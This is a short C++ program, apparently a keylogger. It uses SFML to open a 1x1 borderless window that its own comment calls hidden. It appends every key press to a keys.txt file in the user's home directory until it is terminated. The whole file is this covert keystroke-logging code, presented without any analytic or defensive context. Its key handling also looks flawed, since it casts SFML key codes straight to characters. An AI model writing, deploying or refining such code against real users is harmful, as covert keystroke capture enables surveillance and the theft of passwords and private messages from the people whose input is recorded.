#include <iostream>
#include <fstream>
#include <string>
#include <SFML/Window.hpp>
#include <signal.h>

std::ofstream new_file;
bool terminateRequested = false;

void handleSignal(int signal) {
    if (signal == SIGTERM || signal == SIGINT) {
        // Set the flag to indicate termination is requested
        terminateRequested = true;
    }
}

int main() {
    // Handle signals
    signal(SIGTERM, handleSignal);
    signal(SIGINT, handleSignal);

    std::string file(std::getenv("HOME"));
    file = file + "/keys.txt";
    new_file.open(file, std::ios::app);
    if (!new_file.is_open()) {
        std::cerr << "Error opening file for append." << std::endl;
        return 1;
    }

    sf::Window window(sf::VideoMode(1, 1), "", sf::Style::None); // Create a hidden window

    while (!terminateRequested) {
        sf::Event event;
        while (window.pollEvent(event)) {
            if (event.type == sf::Event::KeyPressed) {
                char ch = static_cast<char>(event.key.code);
                new_file.put(ch);
                new_file.flush();
            }
        }
    }

    // Cleanup
    new_file.close();
    return 0;
}
